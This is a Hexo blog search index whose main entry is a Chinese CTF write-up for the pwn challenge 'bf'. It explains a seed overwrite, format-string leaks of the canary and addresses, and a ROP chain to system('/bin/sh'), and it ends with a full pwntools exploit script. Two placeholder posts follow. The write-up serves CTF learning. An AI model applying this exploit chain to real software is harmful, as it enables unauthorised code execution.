<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[第五空间CTF题目：bf]]></title>
    <url>%2FJac.github.io%2F2019%2F09%2F07%2F%E7%AC%AC%E4%B8%80%E9%A2%98%2F</url>
    <content type="text"><![CDATA[第五空间CTF题目：bf0x00 前期工作1)checksec bf :grinning: 发现可以修改got表，栈上存在canary保护。执行情况如下 2)看来有交互，直接丢IDA分析 第一个交互输入必须是1。 srand() 和 rand() 配合使用，只要seed固定就是产生伪随机数序列。v14变量是个随机数，v9是个用户输入进来的值，之后的逻辑就是：需要v9和v14相等，需要10次命中成功。 IDA中发现pwn这个函数，a1参数写入/bin/sh就可拿shell 若赢了10次，则存在“格式化字符串漏洞+栈溢出”可以溢出到返回地址劫持程序控制流，令其返回到pwn函数执行system最终拿到shell :blush: 。 0x01 利用思路通过前面的分析知道，后续的利用如果想要进行，需要我们先“猜对”10次“随机数“。由于在IDA中发现seed是用time(0)来取的，这会使得每次运行程序的时候，seed的值每次都不一样，不利于我们猜数，因此，寻找能否让seed“固定住”的方法。发现Input your name的存放位置buf，全长0x3c=60输入采用read的方法，可输入0x2a=42 **虽然不能溢出，但足以让我们把seed的值修改掉。原因是：0x3c-0x20=0x1c=28 （28&lt;可输入最大长度42）**OK，利用read函数把seed可以固定为1，这样每次都能制造出相同的一组数来（这里需要清楚，并非10个数每个都相等，而是一组数相等）。 之后我们利用格式化字符串漏洞printf的输出功能打印canary的值，利用栈溢出覆写canary为正确的值绕过canary检查，修改返回地址为pwn。问题1：/bin/sh这个参数怎么造？位置又该怎么放？和64位程序有关么？回答： 由于64位系统，前六个整型或指针参数依次保存在RDI, RSI, RDX, RCX, R8和R9寄存器里，如果还有更多的参数的话才会保存在栈上。 调用system函数，参数是/bin/sh的话,我们要想办法在栈布局时，先将/bin/sh传给rdi，再调用sytem函数。 问题2：怎么传给rdi呢?回答： 利用ROPgadget，查找是否存有pop rdi;ret，然后把/bin/sh放在这条指令后面，执行pop rdi就可实现。 0x02 具体攻击1)首先利用read函数将seed值设置为1。 12345678p.recvuntil('game?\n') p.sendline("1") #enter the game p.recvuntil('Input your name : \n') payload='' payload+='a'*12+p64(0x1d03)+p64(0xa) payload+=p32(0x01) #设置seed的值为1 p.sendline(payload) 解释payload构造：第一个’a’*0xc 是为了填充到我们输入的值v9那里，也就是rbp-0x30第二个p64(0x1d03)是模仿“Round 0 Now guess:”后填入的数(这里可以随便填)第三个p64(0xa)是随便填，只是占个地址 问题：为什么seed值构造的时候要用p32?不是64位程序么？回答：因为seed位置+0x4就到了v14（随机数）的位置，我们尽量不要覆写到这个位置来。而且p32和p64的选择并非跟着程序的位数使用，而是填充0的方式不一样而已。 ②猜数环节我们定位IDA中至关重要的两句：看一下汇编它们是怎么比较的原来[rbp+v14]的值是靠eax传进来的，因此这里每次都会存有v14随机数的值。每次执行下一个循环的判断的时候，这个位置处必定都会出现下一个随机数。因此我们需要在gdb调试中执行到这句汇编处并把下一个数值记录下来。搜集到的10个数，依次利用pwntools传送 123456789#0p.recvuntil('Round 0 Now guess:')num0=0x1d03p.sendline(str(num0))#1p.recvuntil('Round 1 Now guess:')num1=0x99bcp.sendline(str(num1)) 传递后栈的布局可看到是如此：③格式化字符串利用环节： 泄露canary的值printf的输出是buf首地址，因此我们需要在buf处设置好%p类似的格式化字符串打印栈上内容，不过需要注意的是，可供我们格式化的长度只有12个字符，即前面payload的’a’*12我们先要清楚%p打印的是什么内容？【%p - 打印指针，即void * =打印栈地址解引用内容】接着，Canary保护机制的原理，是在一个函数入口处从fs段内获取一个随机整数值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。【注意】Canary一般最高位是\x00，64位程序的canary大小是8个字节，32位的是4个字节，Canary的位置不一定就是与ebp存储的位置相邻，具体得看程序的汇编操作。我们就看汇编里怎么写。结果发现是取[rbp-8]的值与fs:28h比较。那很明显了，此题的Canary就存在相紧挨的位置上。 好了，既然知道了Canary的模样，我们就来确定它的位置和我们猜数输入的d046输入相差而d046，可通过%12$p索引而得打印在窗口里。【这里的12需要自己一步步尝试】则Canary的%p形式索引为%(5+12)$p，即%17$p。 泄露主函数地址高位 为什么要泄露主函数地址高位呢？因为此题开了PIE，会令程序的函数地址发生动态的变化，但地址并非没有规律可循–&gt;低三位会固定,与IDA中看到的值是一样的。而且之后需要利用到pwn函数的地址，还有pop rdi;ret这个gadget的地址，无一不需要利用到主函数地址高位的。pwn函数地址：pop rdi;ret这个gadget的地址： 好了，方向找好了，问题在于我们怎么去找这个主函数地址。gdb中停在主函数的一句汇编处，记录此时主函数的地址是0x562125eabd2d。看栈上是否存在这样的一个地方，正好在我们可打印的范围？【上图所示，有两处】我选择第二个，也就是%23$p，接收时利用[:-3]的小技巧来取高位，我定义为return_addr 由于接收过来的是字符串，我们需要将其转化为整型pop_rdi_ret = int(return_addr+’db3’,16)pwn_addr同理。我们这里只验证一下pop_rdi_ret正确性：【验证成功！】 刚说过，payload中’a’*12，现在已经被我们的’%17$p’和’%23$p’占用了10个字符，还差两个没有使用本来用’,’作为分隔符方便我们截断，但是发现我们的/bin/sh的地址我们无法确定。即使格式化字符串本身拥有任意地址写的功能，但是此题限制了格式化字符串利用的长度。因此这剩下的两个字符我们必须得用它来干什么。我们没有选择，只能用’%p’ 真的是物尽其用啊！！！！ 我们对输出的第三个内容进行索引发现是libc打印函数&lt;IO_2_1_stdout+131&gt;，我们对其进行减偏移的操作 +号后面的是十进制的数【不是16进制】，因此直接打印出的内容-131即可而加载的libc-2.27.so的首地址是：因此，stdout在libc中偏移：0x7f5580228760-0x7f557fe3c000=0x3ec7b0根据这个偏移，我们可以计算/bin/sh的地址 123456789#libc_io_stdout,这是第三个地址泄露libc_io_stdout=int(p.recvuntil('F',drop=True),16)-0x83print "[+] libc_io_stdout is: " + hex(libc_io_stdout) + '\n'#libc_baselibc_base = libc_io_stdout - 0x3ec760print "[+] libc_base is: " + hex(libc_base) + '\n'#bin_addrbin_addr = libc_base + libc.search('/bin/sh').next()print "[+] bin_addr is: " + hex(bin_addr) + '\n' 所有的地址都到位，我们利用栈溢出布置栈。padding=’a’*0x34的原因是buf长度3c，而rbp-0x8是canary的位置，所以只填充0x3c-0x8=0x34的容量。 123payload2=''payload2+='a'*0x34 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bin_addr) + p64(pwn_addr)p.sendline(payload2) 万事俱备，只欠东风！！！前面的一切都没有问题，传参数也正常，但是这里有个坑点，system函数会到这里卡住：经过查阅资料发现，搜索发现，这是这是因为movaps需要我们的rsp+0x40的值能被16整除，解释如下“源操作数或目标操作数是内存操作数时，操作数必须对齐 16 字节边界，否则将生成一般保护性异常 (#GP)。” 【解决方法】加入一个ret即可调整rsp的值符合要求 问题：不过怎么加呢？回答：p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(pwn_addr) ret的地址则由ROPgadget来获取，同样，也是主函数地址高位+889的组合。 完整payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# -*- coding: utf-8 -*-from pwn import *token='xxx'debug=1def exp(p): p.recvuntil('game?\n') p.sendline("1") #enter the game p.recvuntil('Input your name : \n') payload='' payload+='%17$p'+'%23$p'+'%p'+p64(0x1d03)+p64(0xa)#原本是 payload+='a'*12+p64(0x1d03)+p64(0xa) payload+=p32(0x01)#设置seed的值为1 p.sendline(payload) #0 p.recvuntil('Round 0 Now guess:') num0=0x1d03 p.sendline(str(num0)) gdb.attach(p) #1 p.recvuntil('Round 1 Now guess:') num1=0x99bc p.sendline(str(num1)) #2 p.recvuntil('Round 2 Now guess:') num2=0x257b p.sendline(str(num2)) #3 p.recvuntil('Round 3 Now guess:') num3=0xd32e p.sendline(str(num3)) #4 p.recvuntil('Round 4 Now guess:') num4=0x1072b p.sendline(str(num4)) #5 p.recvuntil('Round 5 Now guess:') num5=0xa652 p.sendline(str(num5)) #6 p.recvuntil('Round 6 Now guess:') num6=0x169a9 p.sendline(str(num6)) #7 p.recvuntil('Round 7 Now guess:') num7=0x12cbe p.sendline(str(num7)) #8 p.recvuntil('Round 8 Now guess:') num8=0x5857 p.sendline(str(num8)) #9 p.recvuntil('Round 9 Now guess:') num9=0xd046 p.sendline(str(num9)) # i can return to system sleep(0.1) #利用格式化字符串漏洞泄露canary和主函数地址高位 #canary，这是第一个地址泄露 p.recvuntil('0x') canary = int(p.recvuntil('0x',drop=False)[:-2],16) print "[+] canary is: " + hex(canary)+'\n' #pop_rdi_ret，这是第二个地址泄露 return_addr=p.recvuntil('0x',drop=False)[:-5] pop_rdi_ret = int(return_addr+'db3',16) print "[+] pop_rdi_ret is: " + hex(pop_rdi_ret) + '\n' #ret,这个的作用是rsp+0x40与16对齐 ret = int(return_addr+'889',16) print "[+] ret is: " + hex(ret) + '\n' #pwn_addr pwn_addr=int(return_addr+'aa0',16) print "[+] pwn_addr is: " + hex(pwn_addr) + '\n' #libc_io_stdout,这是第三个地址泄露 libc_io_stdout=int(p.recvuntil('F',drop=True),16)-0x83 print "[+] libc_io_stdout is: " + hex(libc_io_stdout) + '\n' #libc_base libc_base = libc_io_stdout - 0x3ec760 print "[+] libc_base is: " + hex(libc_base) + '\n' #bin_addr bin_addr = libc_base + libc.search('/bin/sh').next() print "[+] bin_addr is: " + hex(bin_addr) + '\n' payload2='' payload2+='a'*0x34 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(pwn_addr) + p64(0xdeadbeef) p.sendline(payload2) p.interactive() if debug: p = process('./bf') libc = ELF('./libc-2.27.so')else: p = remote('df0a72047d6c.gamectf.com',10001) p.recvuntil('Please input you token:\n') p.sendline(token)exp(p)]]></content>
      <categories>
        <category>第五空间大赛</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2FJac.github.io%2F2019%2F08%2F17%2Ftest%2F</url>
    <content type="text"><![CDATA[Quick StartHellow world!!!This is the second post!]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2FJac.github.io%2F2019%2F08%2F17%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
